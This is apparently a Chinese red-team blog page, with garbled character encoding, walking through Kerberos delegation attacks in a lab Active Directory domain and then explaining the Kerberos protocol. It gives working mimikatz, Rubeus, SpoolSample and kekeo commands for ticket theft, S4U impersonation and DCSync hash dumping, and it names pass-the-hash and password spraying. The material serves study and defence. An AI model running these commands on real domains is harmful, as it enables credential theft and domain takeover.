<h3 id="2-2-éçº¦æŸæ€§å§”æ´¾æ”»å‡»"><a href="#2-2-éçº¦æŸæ€§å§”æ´¾æ”»å‡»" class="headerlink" title="2.2 éçº¦æŸæ€§å§”æ´¾æ”»å‡»"></a>2.2 éçº¦æŸæ€§å§”æ´¾æ”»å‡»</h3><p>æˆ‘ä»¬åœ¨mssqlè¿™å°æœºå™¨è®¿é—®åŸŸæ§ã€‚</p>
<p><img src="https://t1.picb.cc/uploads/2021/10/03/wX6FzF.png" alt="wX6FzF.png"></p>
<p>å¯ä»¥çœ‹åˆ°æ˜¯è®¿é—®æ˜¯æ‹’ç»çš„ã€‚ç„¶åæˆ‘ä»¬ç”¨åŸŸç®¡è´¦æˆ·å»è®¿é—®MSSQL</p>
<figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">C:\Users\Administrator\Desktop&gt;dir \\MSSQL.redteam.local\c$</span><br></pre></td></tr></table></figure>



<p>è¿™ä¸ªæ—¶å€™åœ¨MSSQLè¿™å°æœºå™¨çš„lsass.exeå†…å­˜ä¸­ä¼šå­˜åœ¨åŸŸç®¡administratorè´¦æˆ·çš„TGTç¥¨æ®ã€‚ç„¶ååœ¨MSSQLæœºå™¨è¿è¡Œmimikatzã€‚</p>
<figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br></pre></td><td class="code"><pre><span class="line">privilege::debug </span><br><span class="line">å¯¼å‡ºç¥¨æ®</span><br><span class="line">sekurlsa::tickets /export</span><br></pre></td></tr></table></figure>

<p><img src="https://t1.picb.cc/uploads/2021/10/03/wX6Rir.png" alt="wX6Rir.png"></p>
<p>ç„¶åå†æ³¨å…¥ç¥¨æ®åˆ°å†…å­˜é‡Œé¢ï¼Œå†è®¿é—®åŸŸæ§ã€‚</p>
<figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br></pre></td><td class="code"><pre><span class="line">å¯¼å…¥ç¥¨æ®</span><br><span class="line">kerberos::ptt xxx.kirbi</span><br><span class="line">æŸ¥çœ‹ç¥¨æ®</span><br><span class="line">kerberos::list</span><br></pre></td></tr></table></figure>



<p><img src="https://t1.picb.cc/uploads/2021/10/03/wX6xqJ.png" alt="wX6xqJ.png"></p>
<p><img src="https://t1.picb.cc/uploads/2021/10/03/wX6Tx0.png" alt="wX6Tx0.png"></p>
<h3 id="2-3-éçº¦æŸæ€§å§”æ´¾é…åˆæ‰“å°æœº"><a href="#2-3-éçº¦æŸæ€§å§”æ´¾é…åˆæ‰“å°æœº" class="headerlink" title="2.3 éçº¦æŸæ€§å§”æ´¾é…åˆæ‰“å°æœº"></a>2.3 éçº¦æŸæ€§å§”æ´¾é…åˆæ‰“å°æœº</h3><p>é»˜è®¤æƒ…å†µä¸‹SpooleræœåŠ¡æ˜¯è‡ªåŠ¨å¼€å¯çš„ã€‚</p>
<p>ä½¿ç”¨æœ¬åœ°ç®¡ç†å‘˜èº«ä»½è¿è¡ŒRubeusæ¥ç›‘å¬äº‹ä»¶idä¸º4624çš„äº‹ä»¶ï¼Œç„¶åæ—¶é—´è®¾ç½®ä¸º1ç§’ï¼Œå¯ä»¥æˆªå–åˆ°åŸŸæ§çš„TGTã€‚</p>
<figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">Rubeus.exe monitor /interval:1 /filteruser:DC$</span><br></pre></td></tr></table></figure>

<p>ç„¶é€šè¿‡SpoolSample.exeå‘åŸŸæ§å‘èµ·è¯·æ±‚ã€‚</p>
<figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">SpoolSample.exe DC MSSQL</span><br></pre></td></tr></table></figure>

<p>RubeusæˆåŠŸæ¥å—åˆ°äº†TGT</p>
<p><img src="https://t1.picb.cc/uploads/2021/10/04/wXIzwN.png" alt="wXIzwN.png"></p>
<p>å¤åˆ¶ç›‘å¬åˆ°çš„TGTçš„base64</p>
<figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">doIE+jCCBPagAwIBBaEDAgEWooIEETCCBA1hggQJMIIEBaADAgEFoQ8bDVJFRFRFQU0uTE9DQUyiIjAgoAMCAQKhGTAXGwZrcmJ0Z3QbDVJFRFRFQU0uTE9DQUyjggPHMIIDw6ADAgEXoQMCAQKiggO1BIIDsTRd7H8nT8n2+xhFjdYxWkeGwWptrnyKLgxn746x3g+68Wa92RV8mkudwvNSHPEbhA05tXVs62KwV/TjlhSHcjW9U8KfzgGdJpcpF8JrbW+X0ON4J0SyuwtcubsOiulJ6yiyH4riFlMTcl6TXMdbWCnOwIriPfOnQP/jtkcZWx2J27Y2HZ8cCAL00aV14S+ajcA65Howkx1/0ts+YQVZhFpc6l9fFQfGp9R87CjPNpWXEJV0iUGSELptTfXTxNSr/oF3+G7U0KrNl+9NMjloU6tFy/gnmc1PbDnUNXYgdKssUvxUpBzfVxq7leBkX1chx91kPcRrqAZC+tUWSoyULTkCPB8OcYY2DwHy4ElaQbo3y1mmq2DtHTx/ulGvwfKbpQrDgVSKZjE7VGdQSD7eAUJB7Pbu+lHsPc30DLVIbxJEQlC7WRKi1tNc6mhQJtAEGQFUUdYSQNtvNpiphZEfNGUoPaTz/9QspD9jjyVv+Dm7lqup5ojDSAxxc0Gzg61c4KmW3pJlmVQaN4f9Of+LeuqR3tR5EWxPqmkTgv1eVwdGryiF0cNC5Q7SAxrr6mgL2pL2HpMMILwhLSWlk0YIt6qdlyhRRdBzgopSzN5yB3IkSK4RXAF4CFYbximorzkIa9jG34ge9FlSVRkjUxNXb5KnCTDhLymT3F3tJeZoGig4Q+O9pfuUutsuxzSsy8u6xuuXkvg//LuXvDDOuVbOuKHR05tPfc1f9nKqs/YclidoYN3Nf/51pgF4n0ZXieHu5hgZYhb//qKh1X51ezI0MQ1gwkmssF9724s0U1QcLIS4ts3XxPCaDfuOeOLJUoMyqt0BdvYdVn6uGl0b2kCYwtk8ouIfuBbGeSYyGcSo+//tyTNJL57TCy42wRkFecRDdsBrRP8Je46fHBDPp7dhfOwP29Yt4nHFEtCKmjNeYLKQmQnKJ2i4AJKkOyi3QYPcf8Q+uzgU8c5V4p8kj+YBtvUMKQx6Dy1+MTfFz3tY1pQ7KB2pHziop/mm1f6ZPXNtoqcrtlCL+YGDEtgAPxSqaf3eAUhXar39qpUV1ey2Y7Pv/NZg8NevdUUG83LVXIiHHbwGTPBQgccrg9qC0cGHEHs0TNy7cLKc/8s86ZCzvBffmp/Q77QKZIH6jwvxopDjnO0s5jE9F7DVqBK51AWtPuSufXbOTqNMih90jxDJrb9cOZsIqadS7K6fJK232uUHCqSBP4H7QORFRPsCV6YFR13uzFutz+zN59+Y76NUrmhkqqOB1DCB0aADAgEAooHJBIHGfYHDMIHAoIG9MIG6MIG3oBswGaADAgEXoRIEEFo/U0fj+283YVzNrDWB7b+hDxsNUkVEVEVBTS5MT0NBTKIQMA6gAwIBAaEHMAUbA0RDJKMHAwUAYKEAAKURGA8yMDIxMTAwMzEyNDAzMlqmERgPMjAyMTEwMDMyMjQwMjlapxEYDzIwMjExMDEwMTI0MDI5WqgPGw1SRURURUFNLkxPQ0FMqSIwIKADAgECoRkwFxsGa3JidGd0Gw1SRURURUFNLkxPQ0FM</span><br></pre></td></tr></table></figure>



<p>å†Rubeuså¯¼å…¥base64çš„ç¥¨æ®ç›´æ¥æ³¨å…¥è¿›å†…å­˜</p>
<figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">Rubeus.exe ptt /ticket:base64</span><br></pre></td></tr></table></figure>

<p>å¯ä»¥klistçœ‹åˆ°ç¥¨æ®å·²ç»å¯¼å…¥æˆåŠŸ</p>
<p><img src="https://t1.picb.cc/uploads/2021/10/04/wXIEBs.png" alt="wXIEBs.png"></p>
<p>ç„¶åå°±å¯ä»¥ç›´æ¥dcsync</p>
<figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">lsadump::dcsync /domain:redteam.local /all /csv</span><br></pre></td></tr></table></figure>



<p><img src="https://t1.picb.cc/uploads/2021/10/04/wXIYJ7.png" alt="wXIYJ7.png"></p>
<h2 id="0x03-çº¦æŸæ€§å§”æ´¾"><a href="#0x03-çº¦æŸæ€§å§”æ´¾" class="headerlink" title="0x03 çº¦æŸæ€§å§”æ´¾"></a>0x03 çº¦æŸæ€§å§”æ´¾</h2><p>æ“ä½œç¯å¢ƒï¼š</p>
<blockquote>
<p>åŸŸï¼šredteam.local</p>
<p>åŸŸæ§ï¼šDC.redteam.localã€‚ä¸»æœºåï¼šDCã€‚ipï¼š192.168.11.16</p>
<p>åŸŸç®¡è´¦æˆ·ï¼šAdministrator/test123..</p>
<p>åŸŸå†…æœºå™¨ï¼šMSSQL.redteamã€‚ipï¼š192.168.11.8ã€‚æ™®é€šè´¦æˆ·ï¼šhack/test123..</p>
</blockquote>
<p><strong>å‰æï¼š</strong>åœ¨æœåŠ¡Aä¸Šé…ç½®åˆ°æœåŠ¡Bçº¦æŸæ€§å§”æ´¾(åŸŸç®¡ç†å‘˜æ‰æœ‰æƒé™é…ç½®)</p>
<p>1.ç”¨æˆ·è®¿é—®æœåŠ¡Aï¼Œäºæ˜¯å‘åŸŸæ§è¿›è¡Œkerberosè®¤è¯ï¼ŒåŸŸæ§è¿”å›ST1æœåŠ¡ç¥¨æ®ç»™ç”¨æˆ·ï¼Œç”¨æˆ·ä½¿ç”¨æ­¤æœåŠ¡ç¥¨æ®è®¿é—®æœåŠ¡A</p>
<p>2.è‹¥è¯¥æœåŠ¡Aå…è®¸å§”æ´¾ç»™æœåŠ¡Bï¼Œåˆ™Aèƒ½ä½¿ç”¨S4U2Proxyåè®®å°†ç”¨æˆ·å‘é€ç»™è‡ªå·±çš„å¯è½¬å‘çš„ST1æœåŠ¡ç¥¨æ®ä»¥ç”¨æˆ·çš„èº«ä»½å†è½¬å‘ç»™åŸŸæ§åˆ¶å™¨ã€‚äºæ˜¯åŸŸæ§è¿”å›ç»™æœåŠ¡Aä¸€ä¸ªST2æœåŠ¡ç¥¨æ®ï¼Œ</p>
<p>3.æœåŠ¡Aä¾¿èƒ½ä½¿ç”¨è·å¾—çš„ST2æœåŠ¡ç¥¨æ®ä»¥ç”¨æˆ·çš„èº«ä»½è®¿é—®æœåŠ¡Bã€‚</p>
<p>ä»ç½‘ç»œæ”»å‡»çš„è§’åº¦æ¥çœ‹ï¼Œå¦‚æœæ”»å‡»è€…æ§åˆ¶äº†æœåŠ¡Açš„è´¦å·ï¼Œå¹¶ä¸”æœåŠ¡Aé…ç½®äº†åˆ°åŸŸæ§çš„CIFSæœåŠ¡çš„çº¦æŸæ€§å§”æ´¾ã€‚åˆ™æ”»å‡»è€…å¯ä»¥åˆ©ç”¨æœåŠ¡Aä»¥administratorèº«ä»½è®¿é—®åŸŸæ§çš„CIFSæœåŠ¡ï¼Œå³ç›¸å½“äºæ§åˆ¶äº†åŸŸæ§ã€‚</p>
<p>åœ¨kerberosåè®®é‡Œé¢å­˜åœ¨ä¸¤ä¸ªæ‹“å±•å­åè®®S4u2sefltå’ŒS4u2Proxyã€‚æœåŠ¡è´¦å·åªèƒ½è·å–ç”¨æˆ·çš„TGSï¼Œè¿™ä¸ªæ—¶å€™å°±åªèƒ½æ¨¡æ‹Ÿç”¨æˆ·è®¿é—®ç‰¹å®šçš„æœåŠ¡ã€‚</p>
<p><img src="https://t1.picb.cc/uploads/2021/10/03/wXIwmG.png" alt="wXIwmG.png"></p>
<p>å½“è¢«é…ç½®äº†çº¦æŸå§”æ´¾çš„è´¦æˆ·çš„userAccountControlå±æ€§æœ‰ä¸ªFLAGä½ TRUSTED_TO_AUTH_FOR_DELEGATIONï¼Œå¹¶ä¸”msDS-AllowedToDelegateTo å±æ€§è¿˜ä¼šæŒ‡å®šå¯¹å“ªä¸ªSPNè¿›è¡Œå§”æ´¾ã€‚</p>
<p><img src="https://t1.picb.cc/uploads/2021/10/03/wXIfay.png" alt="wXIfay.png"></p>
<h3 id="3-1-ç­›é€‰çº¦æŸæ€§å§”æ´¾è´¦å·"><a href="#3-1-ç­›é€‰çº¦æŸæ€§å§”æ´¾è´¦å·" class="headerlink" title="3.1 ç­›é€‰çº¦æŸæ€§å§”æ´¾è´¦å·"></a>3.1 ç­›é€‰çº¦æŸæ€§å§”æ´¾è´¦å·</h3><h4 id="3-1-1-ldapsearch"><a href="#3-1-1-ldapsearch" class="headerlink" title="3.1.1 ldapsearch"></a>3.1.1 ldapsearch</h4><p>æŸ¥æ‰¾åŸŸä¸­é…ç½®çº¦æŸå§”æ´¾ç”¨æˆ·:</p>
<figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">ldapsearch -x -H ldap://192.168.11.16:389 -D &quot;CN=hack,CN=Users,DC=redteam,DC=local&quot; -w test123.. -b &quot;DC=redteam,DC=local&quot; &quot;(&amp;(samAccountType=805306368)(msds-allowedtodelegateto=*))&quot; |grep -iE &quot;distinguishedName|allowedtodelegateto&quot;</span><br></pre></td></tr></table></figure>

<p>æŸ¥æ‰¾åŸŸä¸­é…ç½®çº¦æŸå§”æ´¾çš„ä¸»æœºï¼š</p>
<figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">ldapsearch -x -H ldap://192.168.11.16:389 -D &quot;CN=hack,CN=Users,DC=redteam,DC=local&quot; -w test123.. -b &quot;DC=redteam,DC=local&quot; &quot;(&amp;(samAccountType=805306369)(msds-allowedtodelegateto=*))&quot; |grep -iE &quot;distinguishedName|allowedtodelegateto&quot;</span><br></pre></td></tr></table></figure>

<h4 id="3-1-2-FuckLdap"><a href="#3-1-2-FuckLdap" class="headerlink" title="3.1.2 FuckLdap"></a>3.1.2 FuckLdap</h4><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">FuckLdap.exe -d 192.168.11.16 -u hack -p test123.. --Checkdelegation</span><br></pre></td></tr></table></figure>

<p><img src="https://t1.picb.cc/uploads/2021/10/03/wXIGaM.png" alt="wXIGaM.png"></p>
<h3 id="3-2-çº¦æŸæ€§å§”æ´¾æ”»å‡»"><a href="#3-2-çº¦æŸæ€§å§”æ´¾æ”»å‡»" class="headerlink" title="3.2 çº¦æŸæ€§å§”æ´¾æ”»å‡»"></a>3.2 çº¦æŸæ€§å§”æ´¾æ”»å‡»</h3><p>æˆ‘ä»¬è¿™é‡Œè®¾ç½®äº†MSSQLè¿™ä¸ªæœºå™¨ç”¨æˆ·å¯¹DCçš„cifsæœåŠ¡çš„å§”æ´¾ã€‚</p>
<p>å½“æˆ‘ä»¬è¦è¿›è¡Œçº¦æŸå§”æ´¾æ”»å‡»çš„å‰æå°±æ˜¯æ‹¿åˆ°è¿™å°å¯ç”¨äº†çº¦æŸå§”æ´¾çš„æœºå™¨æƒé™ã€‚</p>
<p><strong>ç”ŸæˆTGT</strong></p>
<p>é¦–å…ˆç”ŸæˆTGT</p>
<figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">kekeo.exe &quot;tgt::ask /user:MSSQL$ /domain:redteam.local /NTLM:29de42b31e2b7961fda4fbe648d062c9&quot; &quot;exit&quot;</span><br></pre></td></tr></table></figure>



<p><strong>è·å¾—ST</strong></p>
<p>ä½¿ç”¨è¿™å¼ TGTé€šè¿‡ä¼ªé€ s4Uè¯·æ±‚ä»¥administratorç”¨æˆ·èº«ä»½è¯·æ±‚å»è®¿é—®DCçš„cifsçš„ST</p>
<figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">kekeo.exe &quot;tgs::s4u /tgt:TGT_MSSQL$@REDTEAM.LOCAL_krbtgt~redteam.local@REDTEAM.LOCAL.kirbi /user:Administrator@redteam.local /service:cifs/DC.redteam.local&quot; &quot;exit&quot;</span><br></pre></td></tr></table></figure>



<p><code>S4U2Self</code>è·å–åˆ°çš„ST1ä»¥åŠ<code>S4U2Proxy</code>è·å–åˆ°çš„DC CIFSæœåŠ¡çš„ST2ä¼šä¿å­˜åœ¨å½“å‰ç›®å½•ä¸‹</p>
<p><strong>æ³¨å…¥ST2</strong></p>
<figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">kerberos::ptt TGS_Administrator@redteam.local@REDTEAM.LOCAL_cifs~DC.redteam.local@REDTEAM.LOCAL.kirbi</span><br></pre></td></tr></table></figure>



<p>ç„¶åè®¿é—®åŸŸæ§</p>
<p><img src="https://t1.picb.cc/uploads/2021/10/03/wXIHEt.png" alt="wXIHEt.png"></p>

          
        
      
    </div>
    
    
    

    

    

    

    <footer class="post-footer">
      

      

      

      
      
        <div class="post-eof"></div>
      
    </footer>
  </div>
  
  
  
  </article>


    
      

  

  
  
  

  <article class="post post-type-normal" itemscope itemtype="http://schema.org/Article">
  
  
  
  <div class="post-block">
    <link itemprop="mainEntityOfPage" href="http://example.com/2021/10/03/kerberos%E5%8D%8F%E8%AE%AE%E5%8F%8A%E9%97%AE%E9%A2%98/">

    <span hidden itemprop="author" itemscope itemtype="http://schema.org/Person">
      <meta itemprop="name" content="">
      <meta itemprop="description" content="">
      <meta itemprop="image" content="https://avatars.githubusercontent.com/u/47177122?v=4">
    </span>

    <span hidden itemprop="publisher" itemscope itemtype="http://schema.org/Organization">
      <meta itemprop="name" content="æˆ‘æ˜¯GGè¿˜æ˜¯MM">
    </span>

    
      <header class="post-header">

        
        
          <h1 class="post-title" itemprop="name headline">
                
                <a class="post-title-link" href="/2021/10/03/kerberos%E5%8D%8F%E8%AE%AE%E5%8F%8A%E9%97%AE%E9%A2%98/" itemprop="url">kerberosåè®®åŠé—®é¢˜</a></h1>
        

        <div class="post-meta">
          <span class="post-time">
            
              <span class="post-meta-item-icon">
                <i class="fa fa-calendar-o"></i>
              </span>
              
                <span class="post-meta-item-text">å‘è¡¨äº</span>
              
              <time title="åˆ›å»ºäº" itemprop="dateCreated datePublished" datetime="2021-10-03T20:09:25+08:00">
                2021-10-03
              </time>
            

            

            
          </span>

          

          
            
          

          
          

          

          

          

        </div>
      </header>
    

    
    
    
    <div class="post-body" itemprop="articleBody">

      
      

      
        
          
            <h1 id="kerberosåè®®åŠå…¶æ¼æ´"><a href="#kerberosåè®®åŠå…¶æ¼æ´" class="headerlink" title="kerberosåè®®åŠå…¶æ¼æ´"></a>kerberosåè®®åŠå…¶æ¼æ´</h1><table>
<thead>
<tr>
<th>DC</th>
<th>åŸŸæ§</th>
</tr>
</thead>
<tbody><tr>
<td>KDC</td>
<td>å¯†é’¥åˆ†å‘ä¸­å¿ƒï¼Œç”±åŸŸæ§æ‹…ä»»</td>
</tr>
<tr>
<td>AD</td>
<td>æ´»åŠ¨ç›®å½•ï¼Œé‡Œé¢åŒ…å«åŸŸå†…ç”¨æˆ·æ•°æ®åº“</td>
</tr>
</tbody></table>
<table>
<thead>
<tr>
<th>AS</th>
<th>Kerberosè®¤è¯æœåŠ¡</th>
</tr>
</thead>
<tbody><tr>
<td>TGT</td>
<td>TGTè®¤è¯æƒè¯ï¼Œç”±ASæœåŠ¡å‘æ”¾</td>
</tr>
<tr>
<td>TGS</td>
<td>ç¥¨æ®æˆäºˆæœåŠ¡</td>
</tr>
</tbody></table>
<table>
<thead>
<tr>
<th>ST</th>
<th>STæœåŠ¡ç¥¨æ®ï¼Œç”±TGSæœåŠ¡å‘é€</th>
<th></th>
</tr>
</thead>
<tbody><tr>
<td></td>
<td></td>
<td></td>
</tr>
<tr>
<td></td>
<td></td>
<td></td>
</tr>
</tbody></table>
<p><img src="https://i.bmp.ovh/imgs/2021/10/9713cb3ac91af7a8.png"></p>
<p><strong>krbtgt</strong> ç”¨æˆ·ï¼Œè¯¥ç”¨æˆ·æ˜¯åœ¨åˆ›å»ºåŸŸæ—¶ç³»ç»Ÿè‡ªåŠ¨åˆ›å»ºçš„ä¸€ä¸ªè´¦å·ï¼Œå…¶ä½œç”¨æ˜¯å¯†é’¥å‘è¡Œä¸­å¿ƒçš„æœåŠ¡è´¦å·ï¼Œå…¶å¯†ç æ˜¯ç³»ç»Ÿéšæœºç”Ÿæˆçš„ï¼Œæ— æ³•æ­£å¸¸ç™»é™†ä¸»æœºã€‚</p>
<p><img src="https://i.bmp.ovh/imgs/2021/10/0c344c9cb8554144.png"></p>
<p>åŸŸæ§(server08):192.168.3.142</p>
<p>server08ï¼š192.168.3.68</p>
<h1 id="AS-REQ"><a href="#AS-REQ" class="headerlink" title="AS-REQ"></a>AS-REQ</h1><p>å®¢æˆ·ç«¯å‘KDCçš„ASè®¤è¯æœåŠ¡è¯·æ±‚TGTè®¤è¯æƒè¯ã€‚TGTæ˜¯KDCçš„ASè®¤è¯æœåŠ¡å‘æ”¾çš„</p>
<p>1ã€<strong>AS-REQ</strong>ï¼šå½“åŸŸå†…æŸä¸ªç”¨æˆ·è¯•å›¾è®¿é—®åŸŸä¸­çš„æŸä¸ªæœåŠ¡ï¼Œäºæ˜¯è¾“å…¥ç”¨æˆ·åå’Œå¯†ç ï¼Œæœ¬æœºçš„KerberosæœåŠ¡ä¼šå‘KDCçš„ASè®¤è¯æœåŠ¡å‘é€ä¸€ä¸ªAS-REQè®¤è¯è¯·æ±‚ã€‚è¯¥è¯·æ±‚åŒ…ä¸­åŒ…å«ï¼š <strong>è¯·æ±‚çš„ç”¨æˆ·å</strong>ã€<strong>å®¢æˆ·ç«¯ä¸»æœºåã€åŠ å¯†ç±»å‹</strong> å’Œ <strong>Authenticator(ç”¨æˆ·NTLM HashåŠ å¯†çš„æ—¶é—´æˆ³</strong>) ä»¥åŠä¸€äº›å…¶ä»–ä¿¡æ¯ã€‚</p>
<p><img src="https://i.bmp.ovh/imgs/2021/10/055c3962928ed710.png"></p>
<p><img src="https://i.bmp.ovh/imgs/2021/10/90cf7dbe39736038.png"><img src="https://i.bmp.ovh/imgs/2021/10/6976e4ec9c3a2e0a.png"></p>
<h2 id="AS-REQé˜¶æ®µäº§ç”Ÿçš„æ”»å‡»æ–¹å¼"><a href="#AS-REQé˜¶æ®µäº§ç”Ÿçš„æ”»å‡»æ–¹å¼" class="headerlink" title="AS-REQé˜¶æ®µäº§ç”Ÿçš„æ”»å‡»æ–¹å¼"></a>AS-REQé˜¶æ®µäº§ç”Ÿçš„æ”»å‡»æ–¹å¼</h2><h3 id="1-HASHä¼ é€’"><a href="#1-HASHä¼ é€’" class="headerlink" title="1.HASHä¼ é€’"></a>1.HASHä¼ é€’</h3><p>åœ¨AS-REQé˜¶æ®µï¼Œæ˜¯ç”¨ç”¨æˆ·å¯†ç HashåŠ å¯†çš„Authenticatorï¼Œæ‰€ä»¥ä¹Ÿå°±é€ æˆäº†hashä¼ é€’</p>
<p><img src="https://i.bmp.ovh/imgs/2021/10/e4366b8796f758ec.png"></p>
<p>åªé€‚ç”¨äºåŸŸç¯å¢ƒï¼Œå¹¶ä¸”ç›®æ ‡ä¸»æœºéœ€è¦å®‰è£… KB2871997è¡¥ä¸ PTK</p>
<h3 id="2-åŸŸå†…ç”¨æˆ·æšä¸¾"><a href="#2-åŸŸå†…ç”¨æˆ·æšä¸¾" class="headerlink" title="2.åŸŸå†…ç”¨æˆ·æšä¸¾"></a>2.åŸŸå†…ç”¨æˆ·æšä¸¾</h3><p>AS-REQ çš„ cname å€¼ï¼Œå½“ç”¨æˆ·ä¸å­˜åœ¨æ—¶ï¼Œè¿”å›åŒ…æç¤ºé”™è¯¯ï¼Œæ‰€ä»¥é€ æˆäº†æ”¹æ”»å‡»æ–¹å¼ã€‚user.txtä¸éœ€è¦åŠ ä¸Š@0day.orgï¼Œä¹Ÿå¯ä»¥ä½¿ç”¨udp</p>
<p><img src="https://i.bmp.ovh/imgs/2021/10/714224d0713ec9a5.png"></p>
<h3 id="3-å¯†ç å–·æ´’"><a href="#3-å¯†ç å–·æ´’" class="headerlink" title="3.å¯†ç å–·æ´’"></a>3.å¯†ç å–·æ´’</h3><p>å¹¶ä¸”å½“ç”¨æˆ·åå­˜åœ¨ï¼Œå¯†ç æ­£ç¡®å’Œé”™è¯¯æ—¶ï¼Œè¿”å›åŒ…ä¹Ÿä¸ä¸€æ ·ï¼Œæ‰€ä»¥å¯ä»¥è¿›è¡Œç”¨æˆ·åå¯†ç çˆ†ç ´ã€‚è¿™ç§é’ˆå¯¹æ‰€æœ‰ç”¨æˆ·çš„è‡ªåŠ¨å¯†ç çŒœæµ‹é€šå¸¸æ˜¯ä¸ºäº†é¿å…å¸æˆ·è¢«é”å®šï¼Œå› ä¸ºé’ˆå¯¹åŒä¸€ä¸ªç”¨æˆ·çš„è¿ç»­å¯†ç çŒœæµ‹ä¼šå¯¼è‡´å¸æˆ·è¢«é”å®šã€‚æ‰€ä»¥åªæœ‰å¯¹æ‰€æœ‰ç”¨æˆ·åŒæ—¶æ‰§è¡Œç‰¹å®šçš„å¯†ç ç™»å½•å°è¯•ï¼Œæ‰èƒ½å¢åŠ ç ´è§£çš„æ¦‚ç‡ï¼Œæ¶ˆé™¤å¸æˆ·è¢«é”å®šçš„æ¦‚ç‡</p>
<p>é’ˆå¯¹æ˜æ–‡ï¼š</p>
<p><img src="https://i.bmp.ovh/imgs/2021/10/5d1d3364fafc0134.png"></p>
<p>é’ˆå¯¹ntlm hashï¼š</p>
<p><img src="https://i.bmp.ovh/imgs/2021/10/d1197ea83668cff7.png"></p>
<h1 id="AS-REP"><a href="#AS-REP" class="headerlink" title="AS-REP"></a>AS-REP</h1><p>2ã€<strong>AS-REP</strong>ï¼šå½“KDCæ¥æ”¶åˆ°è¯·æ±‚ä¹‹åï¼Œé€šè¿‡ADæ´»åŠ¨ç›®å½•æŸ¥è¯¢å¾—åˆ°è¯¥ç”¨æˆ·çš„å¯†ç Hashï¼Œç”¨è¯¥å¯†ç Hashå¯¹è¯·æ±‚åŒ…çš„Authenticatorè¿›è¡Œè§£å¯†ï¼Œå¦‚æœè§£å¯†æˆåŠŸï¼Œåˆ™è¯æ˜è¯·æ±‚è€…æä¾›çš„å¯†ç æ­£ç¡®ï¼Œè€Œä¸”éœ€è¦æ—¶é—´æˆ³èŒƒå›´åœ¨äº”åˆ†é’Ÿå†…ï¼Œä¸”ä¸æ˜¯é‡æ”¾ï¼Œäºæ˜¯é¢„è®¤è¯æˆåŠŸã€‚KASæˆåŠŸè®¤è¯å¯¹æ–¹çš„èº«ä»½ä¹‹åï¼Œå‘é€å“åº”åŒ…ç»™å®¢æˆ·ç«¯ã€‚å“åº”åŒ…ä¸­ä¸»è¦åŒ…æ‹¬ï¼š<strong>krbtgtç”¨æˆ·çš„NTLM HashåŠ å¯†åçš„TGTè®¤è´­æƒè¯(<strong>å³ticketè¿™éƒ¨åˆ†</strong>)</strong> å’Œ <strong>ç”¨æˆ·NTLM HashåŠ å¯†çš„Login Session key(<strong>å³æœ€å¤–å±‚ enc-part è¿™éƒ¨åˆ†</strong>)</strong> ä»¥åŠä¸€äº›å…¶ä»–ä¿¡æ¯ã€‚è¯¥Login Session Keyçš„ä½œç”¨æ˜¯ç”¨äºç¡®ä¿å®¢æˆ·ç«¯å’ŒKDCä¸‹é˜¶æ®µä¹‹é—´é€šä¿¡å®‰å…¨ã€‚æœ€åTGTè®¤è´­æƒè¯ã€åŠ å¯†çš„Lgoin Session Keyã€æ—¶é—´æˆ³ å’Œ PACç­‰ä¿¡æ¯ä¼šå‘é€ç»™å®¢æˆ·ç«¯ã€‚PACä¸­åŒ…å«ç”¨æˆ·çš„SIDï¼Œç”¨æˆ·æ‰€åœ¨çš„ç»„ç­‰ä¸€äº›ä¿¡æ¯ã€‚</p>
<p><img src="https://i.bmp.ovh/imgs/2021/10/ee6c941a64f195b9.png"></p>
<p>åœ¨enc-parté‡Œé¢æœ€é‡è¦çš„å­—æ®µæ˜¯Login session keyï¼Œä½œä¸ºä¸‹é˜¶æ®µçš„è®¤è¯å¯†é’¥ã€‚</p>
<p>AS-REPä¸­æœ€æ ¸å¿ƒçš„ä¸œè¥¿å°±æ˜¯ Login session-key å’Œ åŠ å¯†çš„ticketã€‚æ­£å¸¸æˆ‘ä»¬ç”¨å·¥å…·ç”Ÿæˆçš„å‡­æ®æ˜¯ .ccache å’Œ .kirbi åç¼€çš„ï¼Œç”¨mimikatzï¼Œkekeoï¼Œrubeusç”Ÿæˆçš„å‡­æ®æ˜¯ä»¥ .kirbi åç¼€çš„ï¼Œimpacket ç”Ÿæˆçš„å‡­æ®çš„åç¼€æ˜¯ .ccache ã€‚ä¸¤ç§ç¥¨æ®ä¸»è¦åŒ…å«çš„éƒ½æ˜¯Login session-key å’Œ åŠ å¯†çš„ ticketï¼Œå› æ­¤å¯ä»¥ç›¸äº’è½¬åŒ–ã€‚</p>
